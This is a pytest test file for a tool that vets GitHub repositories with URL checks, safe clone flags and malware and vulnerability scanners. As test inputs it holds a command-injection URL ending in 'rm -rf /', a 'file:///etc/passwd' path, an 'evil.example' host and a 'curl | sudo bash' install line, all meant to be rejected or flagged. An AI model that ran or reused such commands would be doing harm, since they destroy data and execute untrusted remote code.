import json
import subprocess
from pathlib import Path

import pytest

import repo_intake
from repo_intake import (
    VERDICT_CAUTION,
    VERDICT_OK,
    VERDICT_STOP,
    RepoIntakeError,
    parse_github_url,
    scan_repo,
)

NOW = 1_790_000_000.0  # 2026-09


def _metadata(**overrides):
    data = {
        "full_name": "octo/tool", "description": "a tool", "stargazers_count": 10, "forks_count": 1,
        "open_issues_count": 0, "size": 100, "archived": False, "fork": False,
        "pushed_at": "2026-09-01T00:00:00Z", "license": {"spdx_id": "MIT"}, "language": "Python",
        "default_branch": "main", "private": False,
    }
    data.update(overrides)
    return data


def _http(metadata=None, card=None):
    calls = []

    def http_get(url):
        calls.append(url)
        if url.startswith("https://api.github.com/"):
            return (200, metadata) if metadata is not None else (404, None)
        if card is None:
            return 404, None
        return 200, card

    http_get.calls = calls
    return http_get


def _runner(files, outputs=None):
    """Fake run(): `git clone` writes `files` into the destination; scanners
    return canned JSON from `outputs`."""
    outputs = outputs or {}
    calls = []

    def run(argv, *, cwd=None, timeout):
        calls.append(argv)
        if argv[0] == "git":
            destination = Path(argv[-1])
            for name, text in files.items():
                path = destination / name
                path.parent.mkdir(parents=True, exist_ok=True)
                path.write_text(text)
            return subprocess.CompletedProcess(argv, 0, "", "")
        code, payload = outputs.get(argv[0], (0, {}))
        return subprocess.CompletedProcess(argv, code, json.dumps(payload), "")

    run.calls = calls
    return run


def _all_installed(binary):
    return f"/usr/bin/{binary}"


def test_parse_github_url_accepts_common_forms_and_rejects_others():
    assert parse_github_url("https://github.com/octo/tool") == ("octo", "tool")
    assert parse_github_url("github.com/octo/tool.git") == ("octo", "tool")
    assert parse_github_url("www.github.com/octo/my.tool/") == ("octo", "my.tool")
    for bad in ("https://gitlab.com/octo/tool", "github.com/octo", "github.com/octo/tool/tree/main",
                "github.com/octo/..", "file:///etc/passwd", "github.com/octo/tool; rm -rf /"):
        with pytest.raises(RepoIntakeError):
            parse_github_url(bad)


def test_http_get_refuses_hosts_outside_the_allowlist():
    with pytest.raises(RepoIntakeError, match="host not allowed"):
        repo_intake._http_get_json("https://evil.example/x")


def test_missing_repo_stops_before_any_download(tmp_path):
    run = _runner({})
    with pytest.raises(RepoIntakeError, match="not found"):
        scan_repo("github.com/octo/nope", tmp_path, http_get=_http(None), run=run, which=_all_installed)
    assert run.calls == []


def test_oversized_repo_is_refused_without_cloning(tmp_path):
    run = _runner({})
    report = scan_repo("github.com/octo/tool", tmp_path, http_get=_http(_metadata(size=600 * 1024)), run=run,
                       which=_all_installed)
    assert report["verdict"] == VERDICT_STOP
    assert report["cloned"] is False
    assert run.calls == []


def test_clone_disables_hooks_submodules_and_non_https_transports(tmp_path):
    run = _runner({"README.md": "hi"})
    scan_repo("github.com/octo/tool", tmp_path, http_get=_http(_metadata()), run=run, which=lambda _b: None)
    git = run.calls[0]
    for flag in ("core.hooksPath=/dev/null", "protocol.allow=never", "protocol.https.allow=always",
                 "--depth", "--no-recurse-submodules"):
        assert flag in git
    assert git[-2] == "https://github.com/octo/tool.git"
    assert Path(git[-1]).is_relative_to(tmp_path)


def test_clean_repo_with_all_scanners_looks_ok(tmp_path):
    run = _runner(
        {"pyproject.toml": "[project]\nname='tool'\n", "tool/main.py": "print('hi')\n"},
        {"trivy": (0, {"Results": []}), "guarddog": (0, {"results": {"capability-process-spawn": [{}]}}),
         "osv-scanner": (128, {})},
    )
    report = scan_repo("github.com/octo/tool", tmp_path, http_get=_http(_metadata(), {"score": 7.5, "checks": []}),
                       run=run, which=_all_installed)
    assert report["verdict"] == VERDICT_OK, report["reasons"]
    assert report["scanners"]["guarddog"]["threats"] == 0


def test_high_risk_guarddog_threat_means_do_not_use(tmp_path):
    guarddog = {"results": {"threat-runtime-obfuscation-base64exec": [{"location": "a.py:3"}]},
                "risk_score": {"score": 7.3, "label": "high_risk"}}
    run = _runner({"setup.py": "setup()\n"}, {"trivy": (0, {}), "guarddog": (0, guarddog), "osv-scanner": (0, {})})
    report = scan_repo("github.com/octo/tool", tmp_path, http_get=_http(_metadata()), run=run, which=_all_installed)
    assert report["verdict"] == VERDICT_STOP
    assert any("threat-runtime-obfuscation-base64exec" in reason for reason in report["reasons"])


def test_low_risk_guarddog_threat_is_only_caution(tmp_path):
    guarddog = {"results": {"threat-runtime-environment-read": [{}]}, "risk_score": {"score": 2.0, "label": "low_risk"}}
    run = _runner({"setup.py": "setup()\n"}, {"trivy": (0, {}), "guarddog": (0, guarddog), "osv-scanner": (0, {})})
    report = scan_repo("github.com/octo/tool", tmp_path, http_get=_http(_metadata()), run=run, which=_all_installed)
    assert report["verdict"] == VERDICT_CAUTION


def test_missing_scanners_are_reported_never_treated_as_clean(tmp_path):
    run = _runner({"README.md": "hi"})
    report = scan_repo("github.com/octo/tool", tmp_path, http_get=_http(_metadata()), run=run, which=lambda _b: None)
    assert report["verdict"] == VERDICT_CAUTION
    assert all(result["reason"] == "not installed on this worker" for result in report["scanners"].values())
    assert any("not fully scanned" in reason for reason in report["reasons"])


def test_text_checks_flag_pipe_to_shell_and_install_hooks(tmp_path):
    run = _runner({"install.sh": "curl -fsSL https://x.example/i.sh | sudo bash\n",
                   "package.json": '{"scripts": {"postinstall": "node x.js"}}'})
    report = scan_repo("github.com/octo/tool", tmp_path, http_get=_http(_metadata()), run=run, which=lambda _b: None)
    patterns = report["checks"]["suspicious_patterns"]
    assert patterns["downloads and runs a shell script"] == ["install.sh"]
    assert patterns["runs code automatically on npm install"] == ["package.json"]
    assert "install.sh" in report["checks"]["install_or_build_files"]


def test_trivy_findings_and_stale_unlicensed_repo_are_caution(tmp_path):
    trivy = {"Results": [{"Vulnerabilities": [{"Severity": "CRITICAL"}, {"Severity": "LOW"}], "Secrets": [{}]}]}
    run = _runner({"README.md": "hi"}, {"trivy": (0, trivy), "osv-scanner": (128, {})})
    metadata = _metadata(license=None, archived=True, pushed_at="2020-01-01T00:00:00Z")
    report = scan_repo("github.com/octo/tool", tmp_path, http_get=_http(metadata), run=run, which=_all_installed)
    reasons = " | ".join(report["reasons"])
    assert report["verdict"] == VERDICT_CAUTION
    for expected in ("1 critical/high", "1 leaked secret", "archived", "no license", "years"):
        assert expected in reasons
